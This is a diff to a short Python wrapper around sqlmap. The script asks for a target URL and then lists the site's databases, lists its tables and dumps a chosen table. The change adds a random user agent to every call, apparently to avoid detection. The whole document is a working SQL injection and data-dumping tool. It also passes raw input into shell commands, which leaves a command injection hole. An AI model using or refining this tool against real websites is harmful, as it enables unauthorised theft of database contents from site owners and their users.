@@ -24,11 +24,11 @@ print("""
                                                             
 """)
 a = input("the link : ")
-sqll = os.system('sqlmap -u '+a+ " --dbs --batch")
+sqll = os.system('sqlmap -u '+a+ " --dbs --random-agent --batch")
 d = input("database name : ")
-dat = os.system('sqlmap -u '+a+ " -D "+d+" --tables --batch")
+dat = os.system('sqlmap -u '+a+ " -D "+d+" --tables --random-agent --batch")
 tt = input("the table : ")
-table = os.system('sqlmap -u '+a+ "-D "+d+ " -T "+tt+ " --dump --batch")																								
+table = os.system('sqlmap -u '+a+ "-D "+d+ " -T "+tt+ " --dump --random-agent --batch")																								
 											
 							
 	
